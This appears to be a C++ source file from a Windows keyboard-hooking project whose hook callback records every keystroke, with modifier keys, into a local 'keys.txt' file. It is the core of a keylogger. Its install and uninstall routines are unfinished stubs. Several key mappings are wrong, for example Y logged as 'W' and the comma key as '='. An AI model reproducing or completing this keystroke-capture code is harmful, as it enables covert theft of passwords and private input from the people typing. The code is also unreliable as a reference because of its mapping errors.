#include "KeyboardHooking.h"
#include <Windows.h>


bool KeyIsDownNow(UINT key)
{
	if (GetAsyncKeyState(key) < 0) // higher bit
		return true;
	else
		return false;
}

bool KeyWasDownBefore(UINT key)
{
	if ((GetAsyncKeyState(key) & 0x1) == 0) // higher bit
		return true;
	else
		return false;
}

void KeyboardHooking::StartKeyboardHooking()
{
	// TBD
}

void KeyboardHooking::StopKeyboardHooking()
{
	// TBD
}

void KeyboardHooking::MsgLoop()
{
	MSG message;
	while (GetMessage(&message,NULL,0,0))
    {
		TranslateMessage(&message);
		DispatchMessage(&message);
    }
}

LRESULT CALLBACK KeyboardHooking::KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	std::ofstream key_file;
	key_file.open("keys.txt", std::ios::app);
	if (!key_file.is_open())
	{
		std::wcout << "Could not open the key_file!\n";
	}

	std::map <UINT, KeyPair> key;
	
	key[0x03] = KeyPair(VK_CANCEL, "CANCEL");
	key[0x08] = KeyPair(VK_BACK, "BACKSPACE");
	key[0x09] = KeyPair(VK_TAB, "TAB");
	key[0x0C] = KeyPair(VK_CLEAR, "CLEAR");
	key[0x0D] = KeyPair(VK_RETURN, "ENTER");
	key[0x10] = KeyPair(VK_SHIFT, "SHIFT");
	key[0x11] = KeyPair(VK_CONTROL, "CTRL");
	key[0x12] = KeyPair(VK_MENU, "ALT");
	key[0x13] = KeyPair(VK_PAUSE, "PAUSE");
	key[0x14] = KeyPair(VK_CAPITAL, "CAPSLOCK");
	key[0x1B] = KeyPair(VK_ESCAPE, "ESCAPE");
	key[0x20] = KeyPair(VK_SPACE, " ");
	key[0x21] = KeyPair(VK_PRIOR, "PAGEUP");
	key[0x22] = KeyPair(VK_NEXT, "PAGEDOWN");
	key[0x23] = KeyPair(VK_END, "END");
	key[0x24] = KeyPair(VK_HOME, "HOME");
	key[0x25] = KeyPair(VK_LEFT, "LEFT");
	key[0x26] = KeyPair(VK_UP, "UP");
	key[0x27] = KeyPair(VK_RIGHT, "RIGHT");
	key[0x28] = KeyPair(VK_DOWN, "DOWN");
	key[0x29] = KeyPair(VK_SELECT, "SELECT");
	key[0x2A] = KeyPair(VK_PRINT, "PRINT");
	key[0x2B] = KeyPair(VK_EXECUTE, "EXECUTE");
	key[0x2C] = KeyPair(VK_SNAPSHOT, "PRINTSCR");
	key[0x2D] = KeyPair(VK_INSERT, "INS");
	key[0x2E] = KeyPair(VK_DELETE, "DEL");
	key[0x2F] = KeyPair(VK_HELP, "HELP");
	key[0x30] = KeyPair(0x30, "0");
	key[0x31] = KeyPair(0x31, "1");
	key[0x32] = KeyPair(0x32, "2");
	key[0x33] = KeyPair(0x33, "3");
	key[0x34] = KeyPair(0x34, "4");
	key[0x35] = KeyPair(0x35, "5");
	key[0x36] = KeyPair(0x36, "6");
	key[0x37] = KeyPair(0x37, "7");
	key[0x38] = KeyPair(0x38, "8");
	key[0x39] = KeyPair(0x39, "9");
	key[0x41] = KeyPair(0x41, "A");
	key[0x42] = KeyPair(0x42, "B");
	key[0x43] = KeyPair(0x43, "C");
	key[0x44] = KeyPair(0x44, "D");
	key[0x45] = KeyPair(0x45, "E");
	key[0x46] = KeyPair(0x46, "F");
	key[0x47] = KeyPair(0x47, "G");
	key[0x48] = KeyPair(0x48, "H");
	key[0x49] = KeyPair(0x49, "I");
	key[0x4A] = KeyPair(0x4A, "J");
	key[0x4B] = KeyPair(0x4B, "K");
	key[0x4C] = KeyPair(0x4C, "L");
	key[0x4D] = KeyPair(0x4D, "M");
	key[0x4E] = KeyPair(0x4E, "N");
	key[0x4F] = KeyPair(0x4F, "O");
	key[0x50] = KeyPair(0x50, "P");
	key[0x51] = KeyPair(0x51, "Q");
	key[0x52] = KeyPair(0x52, "R");
	key[0x53] = KeyPair(0x53, "S");
	key[0x54] = KeyPair(0x54, "T");
	key[0x55] = KeyPair(0x55, "U");
	key[0x56] = KeyPair(0x56, "V");
	key[0x57] = KeyPair(0x57, "W");
	key[0x58] = KeyPair(0x58, "X");
	key[0x59] = KeyPair(0x59, "W");
	key[0x5A] = KeyPair(0x5A, "Z");
	key[0x5B] = KeyPair(VK_LWIN, "WIN");
	key[0x5C] = KeyPair(VK_RWIN, "WIN");
	key[0x5D] = KeyPair(VK_APPS, "APPS");
	key[0x5F] = KeyPair(VK_SLEEP, "SLEEP");
	key[0x60] = KeyPair(VK_NUMPAD0, "NUM0");
	key[0x61] = KeyPair(VK_NUMPAD1, "NUM1");;
	key[0x62] = KeyPair(VK_NUMPAD2, "NUM2");
	key[0x63] = KeyPair(VK_NUMPAD3, "NUM3");
	key[0x64] = KeyPair(VK_NUMPAD4, "NUM4");
	key[0x65] = KeyPair(VK_NUMPAD5, "NUM5");
	key[0x66] = KeyPair(VK_NUMPAD6, "NUM6");
	key[0x67] = KeyPair(VK_NUMPAD7, "NUM7");
	key[0x68] = KeyPair(VK_NUMPAD8, "NUM8");
	key[0x69] = KeyPair(VK_NUMPAD9, "NUM9");
	key[0x6A] = KeyPair(VK_MULTIPLY, "NUM*");
	key[0x6B] = KeyPair(VK_ADD, "NUM+");
	key[0x6C] = KeyPair(VK_SEPARATOR, "NUM,");
	key[0x6D] = KeyPair(VK_SUBTRACT, "NUM-");
	key[0x6E] = KeyPair(VK_DECIMAL, "NUM.");
	key[0x6F] = KeyPair(VK_DIVIDE, "NUM/");
	key[0x70] = KeyPair(VK_F1, "F1");
	key[0x71] = KeyPair(VK_F2, "F2");
	key[0x72] = KeyPair(VK_F3, "F3");
	key[0x73] = KeyPair(VK_F4, "F4");
	key[0x74] = KeyPair(VK_F5, "F5");
	key[0x75] = KeyPair(VK_F6, "F6");
	key[0x76] = KeyPair(VK_F7, "F7");
	key[0x77] = KeyPair(VK_F8, "F8");
	key[0x78] = KeyPair(VK_F9, "F9");
	key[0x79] = KeyPair(VK_F10, "F10");
	key[0x7A] = KeyPair(VK_F11, "F11");
	key[0x7B] = KeyPair(VK_F12, "F12");
	key[0x90] = KeyPair(VK_NUMLOCK, "NUM");
	key[0x91] = KeyPair(VK_SCROLL, "SCRLOCK");
	key[0xA0] = KeyPair(VK_LSHIFT, "SHIFT");
	key[0xA1] = KeyPair(VK_RSHIFT, "SHIFT");
	key[0xA2] = KeyPair(VK_LCONTROL, "CTRL");
	key[0xA3] = KeyPair(VK_RCONTROL, "CTRL");
	key[0xA4] = KeyPair(VK_LMENU, "ALT");
	key[0xA5] = KeyPair(VK_RMENU, "ALT");
	key[0xBA] = KeyPair(VK_OEM_1, ";");
	key[0xBC] = KeyPair(VK_OEM_COMMA, "=");
	key[0xBD] = KeyPair(VK_OEM_MINUS, ",");
	key[0xBE] = KeyPair(VK_OEM_PERIOD, ".");
	key[0xBF] = KeyPair(VK_OEM_2, "/");
	key[0xC0] = KeyPair(VK_OEM_3, "`");
	key[0xDB] = KeyPair(VK_OEM_4, "[");
	key[0xDC] = KeyPair(VK_OEM_5, "\\");
	key[0xDD] = KeyPair(VK_OEM_6, "]");
	key[0xDE] = KeyPair(VK_OEM_7, "\'");
	
	if (wParam == WM_SYSKEYDOWN) // for alt key
	{
		if ((GetKeyState(VK_MENU) < 0)
			|| (GetKeyState(VK_LMENU) < 0)
			|| (GetKeyState(VK_RMENU) < 0))
		
			key_file << " [ALT + KEY] ";
	}

	if (wParam == WM_KEYDOWN) // if the key is down
	{
		//get the key from lParam
		PKBDLLHOOKSTRUCT key_param = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code
		
		std::map <UINT, KeyPair>::iterator it;
		
		it = key.find(key_param->vkCode);
		if (it == key.end())
		{
			key_file << " vk_code: " << std::to_string(key_param->vkCode);

		}
		else
		{
			if ((GetKeyState(VK_SHIFT) & 0x8000)
				|| (GetKeyState(VK_LSHIFT) & 0x8000)
				|| (GetKeyState(VK_RSHIFT) & 0x8000))

				key_file << "SHIFT ";

			if ((GetKeyState(VK_CONTROL) & 0x8000)
				|| (GetKeyState(VK_LCONTROL) & 0x8000)
				|| (GetKeyState(VK_RCONTROL) & 0x8000))

				key_file << "CTRL ";

			if ((GetKeyState(VK_LWIN) & 0x8000)
				|| (GetKeyState(VK_RWIN) & 0x8000))

				key_file << "WIN ";

			key_file << (it->second).GetKeyName() << " ";
		}	
	}

	key_file.close();
	return CallNextHookEx(NULL, code, wParam, lParam);
}




